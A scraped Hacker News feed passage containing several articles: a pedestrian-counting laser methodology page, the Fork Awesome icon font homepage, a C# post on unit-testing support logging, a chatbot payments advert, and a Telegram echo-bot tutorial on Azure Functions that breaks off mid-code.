<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><section><div><div><div><h2>Technical principles</h2><p>hystreet.com measures the number of people crossing an imaginary line on a shopping street 24 hours a day, 365 days a year. The laser scanners attached to the facades of houses generate a fourfold light curtain for reliable pedestrian frequency counting. This enables the counter not only to distinguish between different zones, but also to determine the walking directions of pedestrians. Pedestrians who cross an imaginary line several times within a measuring interval are counted anew.</p><p>Furthermore, with this technique, it is possible to distinguish between children and adults, as body size is also a measurable feature. On our website you will find only the pedestrian frequencies of pedestrians over a size of 80 cm.</p></div></div></div></section><section><div><div><div><h2>Live Data</h2><p>Be in the picture at any time and anywhere about the passersby frequency - with the mobile version of hystreet.com you also have the opportunity to conveniently access and analyze all data on the go. All important features and settings are available in the mobile version as well as the ability to save data.</p></div></div></div></section><section><div><div><h2>Hourly retrieval</h2><p>The pedestrian frequency is available for every hour of the year. Thus all daily maximum values are recognizable.</p></div></div></section><section><div><div><h2>Weather data for all metering points</h2><p>We show additional weather data for each measured value of our locations, to provide more context for each measurement. <a href="https://darksky.net/poweredby/">Powered by Dark Sky</a>.</p><ul><li><span>Clear sky, after sunrise</span></li><li><span>Clear sky, after sunset</span></li><li><span>Partly cloudy, after sunrise</span></li><li><span>Partly cloudy, after sunset</span></li><li><span>Mostly cloudy</span></li><li><span>Rainy</span></li><li><span>Windy</span></li><li><svg viewBox="0 0 512 512" width="32"><path fill="currentColor" d="M416 128c-.6 0-1.1.2-1.6.2 1.1-5.2 1.6-10.6 1.6-16.2 0-44.2-35.8-80-80-80-24.6 0-46.3 11.3-61 28.8C256.4 24.8 219.3 0 176 0 114.2 0 64 50.1 64 112c0 7.3.8 14.3 2.1 21.2C27.8 145.8 0 181.5 0 224c0 53 43 96 96 96h320c53 0 96-43 96-96s-43-96-96-96zm57.5 239.5h-435c-8.8 0-16 7.2-16 16v16c0 8.8 7.2 16 16 16h435c8.8 0 16-7.2 16-16v-16c0-8.8-7.2-16-16-16zm0 96h-435c-8.8 0-16 7.2-16 16v16c0 8.8 7.2 16 16 16h435c8.8 0 16-7.2 16-16v-16c0-8.8-7.2-16-16-16z"></path></svg><span>Fog</span></li><li><span>Snowfall</span></li><li><svg id="cloud-sleet_svg__Layer_1" x="0" y="0" viewBox="0 0 512 512" xml:space="preserve" width="32"><g fill="currentColor"><path d="M144.7 395.5c15.4 0 27.8 12.5 27.8 27.8 0 15.4-12.5 27.8-27.8 27.8-15.4 0-27.8-12.5-27.8-27.8-.1-15.4 12.4-27.8 27.8-27.8zM256 451.1c15.4 0 27.8 12.5 27.8 27.8 0 15.4-12.5 27.8-27.8 27.8-15.4 0-27.8-12.5-27.8-27.8s12.4-27.8 27.8-27.8zM367.3 395.5c15.4 0 27.8 12.5 27.8 27.8 0 15.4-12.5 27.8-27.8 27.8-15.4 0-27.8-12.5-27.8-27.8 0-15.4 12.5-27.8 27.8-27.8z"></path><path d="M416 128c-.6 0-1.1.2-1.6.2 1.1-5.2 1.6-10.6 1.6-16.2 0-44.2-35.8-80-80-80-24.6 0-46.3 11.3-61 28.8C256.4 24.8 219.3 0 176 0 114.2 0 64 50.1 64 112c0 7.3.8 14.3 2.1 21.2C27.8 145.8 0 181.5 0 224c0 53 43 96 96 96h32.7l.1 35.5c0 8.9 7.2 16 16.1 15.9 2.9 0 5.6-.8 7.9-2.1 4.8-2.7 8-7.9 8-13.9l-.1-35.4H240l.2 84.4c0 8.9 7.2 16 16.1 15.9 2.9 0 5.6-.8 7.9-2.1 4.8-2.7 8-7.9 8-13.9L272 320h79.4l.1 35.5c0 8.9 7.2 16 16.1 15.9 2.9 0 5.6-.8 7.9-2.1 4.8-2.7 8-7.9 8-13.9l-.1-35.4H416c53 0 96-43 96-96s-43-96-96-96z"></path></g></svg><span>Sleet</span></li></ul></div></div></section><section><div><div><h2>Eye-safe and safe under data protection law</h2><p>The technique we use is eye-safe and invisible.
Personal data is not collected with this technology. Thus
we work with a 100% GDPR compliant solution.</p><h2>99% counting accuracy</h2><p>According to the manufacturer, a counting accuracy of 99% can be achieved with the technology used up to a flow rate of approx. 500 persons per minute.</p><h2>Precise positioning of the laser scanners</h2><p>Laser scanners (type PeCo LC) are permanently installed on the facades at all metering points. The devices are installed at a height between 4 and 20 metres. The device can thus optimally measure a road width of up to 32 metres.</p><p>For street widths over 32 metres, it is possible to measure from two opposite sides. The published data is always the pedestrian frequency of the entire street width (unless otherwise specified).</p><h2>Verification of data</h2><p>The laser must have a clear view in its measuring lines. If these once blocked by external circumstances (e.g. scaffolding, cranes, superstructures or treetops), temporary measurement inaccuracies may occur as a result. Even in case of power failures it is not possible to measure the frequencies. The measured data are therefore randomly checked and corrected if necessary.</p></div></div></section><section><div><div><p><span>Peco LC</span></p><div><h2>Technical data PeCo LC</h2><ul><li>Laser class 1</li><li>Weight: 3,4kg</li><li>Dimension: 247x121x109 (hxdxw)</li><li>Minimum installation height 4m, Maximum height: 20 m</li><li>Power consumption: 0.047 kW/h, electricity costs: ca. 45€/year</li></ul></div></div></div><p><img src="https://hystreet.com/packs/media/sections/assets/lase-logo-713d4738753630d32ce040de8be25fc4.png"></p></section><section><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none" style="bottom:100%"><polygon points="0,100 100,100 0,0"></polygon></svg></section></div></div></div>]]>
            </description>
            <link>https://hystreet.com/en/methodology</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057455</guid>
            <pubDate>Wed, 11 Nov 2020 11:26:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fork Awesome: a fork of the iconic font and CSS toolkit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057452">thread link</a>) | @edward
<br/>
November 11, 2020 | https://forkaweso.me/Fork-Awesome/ | <a href="https://web.archive.org/web/*/https://forkaweso.me/Fork-Awesome/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrap"> <!-- necessary for sticky footer. wrap all content except footer -->
    


    




<div>
  <section id="why">
  <div>
    <div>
      <h4> One Font, 744 Icons</h4><p>
      In a single collection, Fork Awesome is a pictographic language of web-related actions.
    </p></div>
    <div>
      <h4> No JavaScript Required</h4><p>
      Fewer compatibility concerns because Fork Awesome doesn't require JavaScript.
    </p></div>
    <div>
      <h4> Infinite Scalability</h4><p>
      Scalable vector graphics means every icon looks awesome at any size.
    </p></div>
    <div>
      <h4> Free, as in Speech</h4><p>
      Fork Awesome is completely free for commercial use. Check out the <a href="https://forkaweso.me/Fork-Awesome/license/">license</a>.
    </p></div>
    <div>
      <h4> CSS Control</h4><p>
      Easily style icon color, size, shadow, and anything that's possible with CSS.
    </p></div>
    <div>
      <h4> Perfect on Retina Displays</h4><p>
      Fork Awesome icons are vectors, which mean they're gorgeous on high-resolution displays.
    </p></div>
    <div>
      <h4> Plays Well with Others</h4><p>
      Originally designed for <a href="http://getbootstrap.com/">Bootstrap</a>, Fork Awesome works great with all frameworks.
    </p></div>
    <div>
      <h4> Desktop Friendly</h4><p>
      To use on the desktop or for a complete set of vectors,
      check out the <a href="https://forkaweso.me/Fork-Awesome/cheatsheet/">cheatsheet</a>.
    </p></div>
    
  </div>
</section>

  <section id="thanks-to">
  
  <div>
    <p>
        Thanks to <a href="https://twitter.com/davegandy">@davegandy</a> for his
        original work on Font Awesome and to
        <a href="https://twitter.com/gtagliala">@gtagliala</a> for managing pull
        requests and issues on the Font Awesome Github repo.
      </p>
    <p>
        Thanks to the still growing community of <a href="https://github.com/ForkAwesome/Fork-Awesome/blob/master/CONTRIBUTORS.md">115 contributors</a> who've carried this project from the early days of Font Awesome and who have joined this project since the fork.
        If you feel your contribution has not been recognized. Please file an issue, we'll happily add you to the list.
      </p>
  </div>
</section>

</div>




  </div></div>]]>
            </description>
            <link>https://forkaweso.me/Fork-Awesome/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057452</guid>
            <pubDate>Wed, 11 Nov 2020 11:25:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Write Unit Tests for Logging]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25057372">thread link</a>) | @JanVanRyswyck
<br/>
November 11, 2020 | https://principal-it.eu/2020/11/unit-tests-for-logging/ | <a href="https://web.archive.org/web/*/https://principal-it.eu/2020/11/unit-tests-for-logging/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div>
					<h2>
						How To Write Unit Tests For Logging
					</h2>
					<p><span>
						November 11, 2020
					</span>
				</p></div>

				
<p>Once in a while I get asked the question whether one should write <a href="https://principal-it.eu/2019/10/taxonomy-of-tests/">solitary tests</a> for 
logging functionality. My answer to this question is the typical consultant answer: “It depends”. In essence, logging 
is an infrastructure concern. The end result is log data that is being written to a resource which is external to 
an application. Usually the generated data ends up in a file, a database or it might even end up in a cloud service.</p>

<p>Because logging crosses the process boundary of an application, it is more useful to write 
<a href="https://principal-it.eu/2019/10/taxonomy-of-tests/">sociable tests</a> to verify this particular functionality. It doesn’t make sense to 
use solitary tests in this particular case.</p>

<p>That being said, there are situations where business requirements explicitly state that logging should be a part of the 
interface of an application. In this situation, the intent of logging should be expressed explicitly by the code which 
in turn should also be exercised by solitary tests. The excellent book 
<a href="https://bit.ly/tdd-goos2" target="blank" rel="noopener noreferrer nofollow">Growing Object Oriented Software 
Guided By Tests</a>, written by Steve Freeman and Nat Pryce, mentions that there are generally two separate types of 
logging:</p>

<ul>
  <li>Support logging</li>
  <li>Diagnostic logging</li>
</ul>

<p>A support log contains messages that are intended for those that perform operational activities. These messages are used 
to determine whether the system behaves correctly or not. The log level for these messages is usually of type <em>error</em> 
or <em>info</em>.</p>

<p>A diagnostic log on the other hand holds messages that are targeted towards software developers. These messages provide 
valuable insights into the details of a running system. The log level for these messages is usually of type <em>debug</em> or 
<em>trace</em>.</p>

<p>Given these two types of logging, the basic idea is that code which expresses the intent of support logging should be 
exercised by solitary tests. Code statements that initiate diagnostic logging are usually not covered by tests.</p>

<p>Let’s have a look at an example that demonstrates both support and diagnostic logging in action.</p>

<pre><code>public class ExpenseSheetController : Controller
{
    private readonly ICommandHandler&lt;CreateExpenseSheet&gt; _commandHandler;
    private readonly ISupportNotifier _supportNotifier;

    public ExpenseSheetController(ICommandHandler&lt;CreateExpenseSheet&gt; commandHandler,
                                  ISupportNotifier supportNotifier)
    {
        _commandHandler = commandHandler;
        _supportNotifier = supportNotifier;
    }
    
    [HttpPost]
    [ServiceFilter(typeof(PerformanceTracing))]
    public IActionResult Create(CreateExpenseSheetFormModel formModel)
    {
        try
        {
            var command = new CreateExpenseSheet(Guid.NewGuid(), formModel.EmployeeId);
            _commandHandler.Handle(command);
        }
        catch(Exception ex)
        {
            _supportNotifier.ErrorDuringExpenseSheetCreation(ex, formModel.EmployeeId);
            return BadRequest();
        }
        
        _supportNotifier.ExpenseSheetCreated(formModel.EmployeeId);
        return Ok();
    }
}
</code></pre>

<p>Here we have the implementation of a controller that can receive a request for creating a new expense sheet. Notice that 
the constructor of this controller class expects an instance of the <em>ISupportNotifier</em> interface. This dependency is 
being used by the implementation of the <em>Create</em> method for logging an error when an exception occurs. It is also used 
for logging when an expense sheet has been successfully created.</p>

<p>This is how the implementation of the <em>SupportNotifier</em> looks like.</p>

<pre><code>public class SupportNotifier : ISupportNotifier
{
    private readonly ILogger&lt;SupportNotifier&gt; _logger;

    public SupportNotifier(ILogger&lt;SupportNotifier&gt; logger)
    {
        _logger = logger;
    }
    
    public void ExpenseSheetCreated(Guid employeeId)
    {
        _logger.LogInformation("Expense sheet created for employee with ID '{employeeId}'.");
    }

    public void ErrorDuringExpenseSheetCreation(Exception ex, Guid employeeId)
    {
        _logger.LogError(ex, $"Unable to create a new expense sheet for employee with ID '{employeeId}'");
    }
}
</code></pre>

<p>This code demonstrates that support logging uses log levels <em>error</em> or <em>info</em> depending on the context. Verifying the
code of the <em>SupportNotifier</em> class itself can be done by using sociable tests. It’s not a good idea to write
solitary tests for the <em>SupportNotifier</em> class. This would imply that a test double should be used as an instance of 
<em>ILogger</em>. As we already touched on in a <a href="https://principal-it.eu/2020/05/test-double-heuristics/">previous blog post</a>, it’s much better to 
avoid using test doubles for types that you don’t own. In this particular case it would even be quite hard to do as 
the <em>Logxx</em> methods of <em>ILogger</em> are actually extension methods and not regular methods.</p>

<p>Let’s have a look at the tests for the <em>ExpenseSheetController</em>.</p>

<pre><code>[Specification]
public class When_handling_a_request_for_creating_a_new_expense_sheet
{
    [Establish]
    public void Context()
    {
        var commandHandler = Substitute.For&lt;ICommandHandler&lt;CreateExpenseSheet&gt;&gt;();
        _supportNotifier = Substitute.For&lt;ISupportNotifier&gt;();

        _sut = new ExpenseSheetController(commandHandler, _supportNotifier);
    }

    [Because]
    public void Of()
    {
        var formModel = new CreateExpenseSheetFormModel 
        { 
            EmployeeId = new Guid("94EDE8F3-9675-4DD7-A18F-E37B1F323699") 
        };

        _sut.Create(formModel);
    }
    
    [Observation]
    public void Then_it_should_notify_support()
    {
        _supportNotifier.Received()
            .ExpenseSheetCreated(new Guid("94EDE8F3-9675-4DD7-A18F-E37B1F323699"));
    }

    private ExpenseSheetController _sut;
    private ISupportNotifier _supportNotifier;
}

[Specification]
public class When_an_error_occurs_while_handling_a_request_for_creating_a_new_expense_sheet
{
    [Establish]
    public void Context()
    {
        _supportNotifier = Substitute.For&lt;ISupportNotifier&gt;();
        _exception = new InvalidOperationException("Meltdown");
        
        var commandHandler = Substitute.For&lt;ICommandHandler&lt;CreateExpenseSheet&gt;&gt;();
        commandHandler.WhenForAnyArgs(ch =&gt; ch.Handle(null))
            .Throw(_exception);
        
        _sut = new ExpenseSheetController(commandHandler, _supportNotifier);
    }
    
    [Because]
    public void Of()
    {
        var formModel = new CreateExpenseSheetFormModel 
        { 
            EmployeeId = new Guid("D1067157-5C73-4140-9D29-0FE5C1C4C2FB") 
        };

        _sut.Create(formModel);
    }
    
    [Observation]
    public void Then_it_should_notify_support_that_a_new_expense_sheet_has_been_created()
    {
        _supportNotifier.Received()
            .ErrorDuringExpenseSheetCreation(_exception, 
                new Guid("D1067157-5C73-4140-9D29-0FE5C1C4C2FB"));
    }
    
    private ExpenseSheetController _sut;
    private ISupportNotifier _supportNotifier;
    private Exception _exception;
}
</code></pre>

<p>These tests verify whether support logging occurs when an expense sheet has been created or when an exception gets 
raised. This way we express the intent of the operational requirements.</p>

<p>Notice that controller method has been decorated with a <em>ServiceFilter</em> attribute.</p>

<pre><code>[HttpPost]
[ServiceFilter(typeof(PerformanceTracing))]
public IActionResult Create(CreateExpenseSheetFormModel formModel)
{
    ...
}
</code></pre>

<p>By applying this attribute, the <em>PerformanceTracing</em> action filter is being registered to surround the execution of the 
controller method. Let’s have a look at the implementation of this action filter.</p>

<pre><code>public class PerformanceTracing : ActionFilterAttribute
{
    private readonly ILogger&lt;PerformanceTracing&gt; _logger;
    private readonly Stopwatch _stopWatch;

    public PerformanceTracing(ILogger&lt;PerformanceTracing&gt; logger)
    {
        _logger = logger;
        _stopWatch = new Stopwatch();
    }

    public override void OnActionExecuting(ActionExecutingContext context)
    {
        _stopWatch.Start();
    }

    public override void OnActionExecuted(ActionExecutedContext context)
    {
        _stopWatch.Stop();

        var controllerName = context.Controller.GetType().Name;
        var controllerActionName = context.ActionDescriptor.DisplayName;
        
        _logger.LogTrace($"Action '{controllerActionName}' of controller {controllerName} executed in " + 
            $"{_stopWatch.ElapsedMilliseconds} ms.");
    }
}
</code></pre>

<p>This implementation is a nice example of diagnostic logging. The action filter measures the execution time of a 
controller method and logs the result. Notice that we’re injecting the <em>ILogger</em> interface directly into the constructor.
By registering the <em>PerformanceTracing</em> action filter using the <em>ServiceFilter</em> attribute, we ensure that an instance 
of <em>ILogger</em> gets resolved and properly injected. We didn’t provide any tests for this implementation.</p>

<p>I think it’s useful to consider support logging and diagnostic logging as two separate concepts, even though they quite 
often use the same mechanisms under the hood.</p>


				<p>
						<em>
							If you and your team want to learn more about how to <u>write maintainable unit tests</u>
							and <u>get the most out of TDD practices</u>, make sure to have look at our
							<a href="https://principal-it.eu/training.html">trainings and workshops</a> or checkout
							the <a href="https://principal-it.eu/books.html">books section</a>. Feel free to reach
							out at <span>info@principal-it.be</span>.
						</em>
					</p>

				

				

				
			</div></div>]]>
            </description>
            <link>https://principal-it.eu/2020/11/unit-tests-for-logging/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057372</guid>
            <pubDate>Wed, 11 Nov 2020 11:06:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Revolutionize your support with Chat Bot]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25057330">thread link</a>) | @eugen_2pay
<br/>
November 11, 2020 | https://tap2pay.me/revolutionize-support-chat-bot/ | <a href="https://web.archive.org/web/*/https://tap2pay.me/revolutionize-support-chat-bot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p>Robots are taking over our daily routine in every aspect of our life: from paying bank bills to cleaning the house. It does not mean that within a year you will be leaving in a Matrix, but modern robots will for sure simplify your life in many ways.</p>

<p>Automation is everything. Chat support on smartphone saves our time and energy for more important things.</p>

<p>According to a survey, <strong>over 80% of customer problems will be solved with the help of chatbots.</strong></p>

<p>What kind of customers can really use the help of live support?</p>

<h4>Here are the Top 5 Business Areas that benefit from ChatBot support:</h4>

<p><strong>Banks</strong></p>
<p>• prompting nearest branch locations, self-service terminals<br>
• sending information about available credit programs and its terms<br>
• helping to choose the necessary type of deposit<br>
• accepting the request for required documents</p>

<p><strong>Events selling agencies</strong></p>
<p>• registering of new clients<br>
• answering basic queries about cost, time, and location<br>
• performing support functions<br>
• booking tickets online</p>

<p><strong>Online Stores</strong></p>
<p>• registering new customers<br>
• processing order placements<br>
• processing payments for products<br>
• conducting marketing surveys</p>

<p><strong>Mobile operators</strong></p>
<p>• onboarding of new users<br>
• processing payments<br>
• answering basic queries about cost, time, and location</p>

<p><iframe width="1140" height="641" src="https://www.youtube.com/embed/yCcQpyYSvks?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

<p><strong>Providers of Education services</strong></p>
<p>• processing payments<br>
• helping to choose an educational program<br>
• accepting requests for required programs</p>

<p><img src="https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture.jpg" alt="" width="700" height="393" srcset="https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture.jpg 700w, https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture-300x168.jpg 300w, https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture-71x40.jpg 71w, https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture-255x143.jpg 255w, https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture-142x80.jpg 142w, https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture-360x202.jpg 360w, https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture-500x281.jpg 500w, https://tap2pay.me/wp-content/uploads/2020/11/chat-bot-picture-600x337.jpg 600w" sizes="(max-width: 700px) 100vw, 700px"></p>

<p><a href="https://secure.tap2pay.me/users/signup">Tap2Pay</a> strives for excellence in every aspect of creating smooth and friendly chat support on smartphones.</p>
<p>We have developed stunning software for effortless payment processing via the most well-known social media messengers Facebook, Instagram, Telegram, WhatsApp with built-in chatbot client support.</p>

<p><iframe width="1140" height="641" src="https://www.youtube.com/embed/jJxIfNR99Do?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

<p>If you need any assistance with updating your payment processing method with built-in chat support, please <a href="https://tap2pay.me/contacts/">connect with our Customer Support Team.</a></p>
	
                </div></div>]]>
            </description>
            <link>https://tap2pay.me/revolutionize-support-chat-bot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057330</guid>
            <pubDate>Wed, 11 Nov 2020 10:58:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Telegram Bot with Azure Functions and Node.js]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057328">thread link</a>) | @qpbp_user
<br/>
November 11, 2020 | http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/ | <a href="https://web.archive.org/web/*/http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><ul><li><a href="#introduction">Introduction</a></li><li><a href="#flow-review">Flow Review</a></li><li><a href="#prerequisites">Prerequisites</a></li><li><a href="#create-an-azure-function-in-visual-studio-code">Create an Azure function in Visual Studio Code</a></li><li><a href="#folder-structure">Folder structure</a></li><li><a href="#run-function-locally">Run function locally</a></li><li><a href="#implement-the-bot">Implement the bot</a></li><li><a href="#running-bot-locally">Running bot locally</a></li><li><a href="#deploy-azure-function-to-the-portal">Deploy Azure Function to the portal</a></li><li><a href="#conclusion">Conclusion</a></li></ul><h2 id="introduction">Introduction</h2><p>In this tutorial, we will create an Azure Function with a simple Telegram Bot (Echo Bot). We will test it locally and then deploy it to Azure Portal. It means our bot will work only at the moment when someone is using it. So the function will be triggered only when someone is sending a message to a bot.</p><h2 id="flow-review">Flow Review</h2><ol><li>The user sends any message to Telegram Bot</li><li>Telegram sends requests via Webhook to our Azure Function</li><li>Azure Function replies to Webhook with a copied message</li></ol><h2 id="prerequisites">Prerequisites</h2><ul><li>node.js - v10.16.2</li><li>npm - v6.14.5</li><li>telegraf - v3.38.0</li><li>ngrok - v2.3.35</li><li>Azure subscribtion</li><li>you need to install <a href="https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurefunctions">Azure Functions extension</a> to Visual Studio Code</li></ul><h2 id="create-an-azure-function-in-visual-studio-code">Create an Azure function in Visual Studio Code</h2><ol><li><p>click on Azure Icon in Visual Studio Code</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.48.39-1024x885.png" alt="Azure Icon in VSC"></p></li><li><p>login under your Azure subscription</p></li><li><p>click on “Create Function Icon”</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.51.16.png" alt="Create Function Icon"></p></li><li><p>you will be asked to use an existing project or create a new. Let’s create a new:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.54.40-1024x281.png" alt="Create a new project"></p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.55.13-1024x589.png" alt="Create new project folder"></p></li><li><p>select the function template. We will use <strong>HTTP trigger</strong>:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.55.36-1024x607.png" alt="Choose a Function Template"></p></li><li><p>provide a function name and select Enter:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.56.16-1024x213.png" alt="Enter the name of the function"></p></li><li><p>please provide a <strong>Function</strong> key for a <strong>Function authorization</strong>:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.56.27-1024x280.png" alt="Function Authorization level"></p></li><li><p>penultimate step. Select how you would like to open a project. We will use the current window:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.56.39-1024x291.png" alt="How to open a function project in Visual Studio Code"></p></li><li><p>you will be redirected to the <strong>default HTTP trigger function with Javascript code</strong>:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-10.57.02-1024x618.png" alt="The default function Code"></p></li><li><p>now this function will appear in Azure Functions section:</p></li></ol><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-11.23.30-1024x340.png" alt="Newly created function"></p><h2 id="folder-structure">Folder structure</h2><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-11.29.34-300x256.png" alt="Function Folder Structure"></p><ul><li><strong>package.json</strong> - metadata relevant to the Node.js project</li><li><strong>proxies.json</strong> - you can modify requests and responses from function</li><li><strong>host.json</strong> - metadata file relevant to the Azure project. It’s a global configuration for all functions in an application</li><li><strong>azure-bot-cloud-function</strong> - it’s our function folder. Each function has a separate folder with code file (.js in our case) and function.json. Function.json it’s a <a href="https://docs.microsoft.com/en-us/azure/azure-functions/functions-bindings-expressions-patterns">binding configuration file</a>.</li></ul><h2 id="run-function-locally">Run function locally</h2><ol><li><p>Select Run -&gt; Start Debugging in Visual Studio Code menu</p></li><li><p>If you have no Azure Functions Core Tools locally, you need to install them on this step. The instruction can be found in <a href="https://github.com/Azure/azure-functions-core-tools#installing">Azure repo:</a></p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-20.48.48-1024x127.png" alt="Install Azure Function Core Tools"></p></li><li><p>You should see how the NPM tasks will executing and finally get a link to the working function:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-21.08.28-1024x601.png" alt="Link to the local Azure function"></p></li><li><p>Let’s open our function in the browser:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-07-at-21.20.46-1024x274.png" alt="Azure Function is working locally"></p><p>As you see, the function responds to us with the behavior by default. Also, you can simply run the function using the <strong>func start</strong> command.</p></li></ol><h2 id="implement-the-bot">Implement the bot</h2><p>For work with Telegram API, we will use the most popular library for Node.js - <a href="https://github.com/telegraf/telegraf">Telegraf.js</a>. We need to install it in the project folder:</p><div><pre><code data-lang="bash">npm install telegraf --save
</code></pre></div><p>Please make sure the <code>package.json</code> has Telegraf after the running previous command.</p><p>Because Telegram will send webhook requests to our bot, we need to make an external HTTPS URL. For this purpose we can use <a href="https://ngrok.com/">ngrok library</a>:</p><p>If all is good, we can go to <code>function-folder&gt;/index.js</code> and create a simple Echo-bot:</p><div><pre><code data-lang="javascript"><span>const</span> <span>Telegraf</span> <span>=</span> <span>require</span>(<span>'telegraf'</span>)
<span>const</span> { <span>TELEGRAM_BOT_TOKEN</span>, <span>WEBHOOK_ADDRESS</span> } <span>=</span> <span>process</span>.<span>env</span>

<span>const</span> <span>bot</span> <span>=</span> <span>new</span> <span>Telegraf</span>(<span>TELEGRAM_BOT_TOKEN</span>, {<span>telegram</span><span>:</span> { <span>webhookReply</span><span>:</span> <span>true</span> }})

<span>bot</span>.<span>telegram</span>.<span>setWebhook</span>(<span>WEBHOOK_ADDRESS</span>)
<span>bot</span>.<span>on</span>(<span>'message'</span>, (<span>ctx</span>) =&gt; <span>ctx</span>.<span>telegram</span>.<span>sendCopy</span>(<span>ctx</span>.<span>chat</span>.<span>id</span>, <span>ctx</span>.<span>message</span>))

<span>module</span>.<span>exports</span> <span>=</span> <span>async</span> <span>function</span> (<span>context</span>, <span>req</span>) {
	<span>return</span> <span>bot</span>.<span>handleUpdate</span>(<span>req</span>.<span>body</span>, <span>context</span>.<span>res</span>)
}
</code></pre></div><p>You can take <code>TELEGRAM_BOT_TOKEN</code> value from <a href="https://telegram.me/BotFather">BotFather bot</a>. The <code>WEBHOOK_ADDRESS</code> will contain a link to the Azure Function. We will talk about this variable later. Our bot will work in Webhook mode - it’s a more preferable way to run Telegram bot. The Telegram will automatically inform our bot about all updates. In the polling mechanism, our bot needs to frequently ask Telegram about updates, so it requires non-stop work for our bot (most cases).</p><h2 id="running-bot-locally">Running bot locally</h2><p>To run this bot locally we need to create a public address using ngrok. By default, the local Azure function is running on port <code>7071</code>. We can use the following combination in the terminal to create a public URL:</p><p>In the terminal you will get your HTTPS link for testing Webhook:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.29.42-1024x400.png" alt="HTTPS public URL using ngrok"></p><p>Copy the ngrok-created link and add the route to the function. Something similar to this:</p><div><pre><code data-lang="javascript"><span>bot</span>.<span>telegram</span>.<span>setWebhook</span>(<span>'https://&lt;random-value&gt;.ngrok.io/api/azure-bot-cloud-function'</span>)
</code></pre></div><p>Also, don’t forget to pass a real Telegram token to the Telegraf constructor:</p><div><pre><code data-lang="javascript"><span>const</span> <span>bot</span> <span>=</span> <span>new</span> <span>Telegraf</span>(<span>'some-token-value'</span>, {
	<span>telegram</span><span>:</span> { <span>webhookReply</span><span>:</span> <span>true</span> },
})
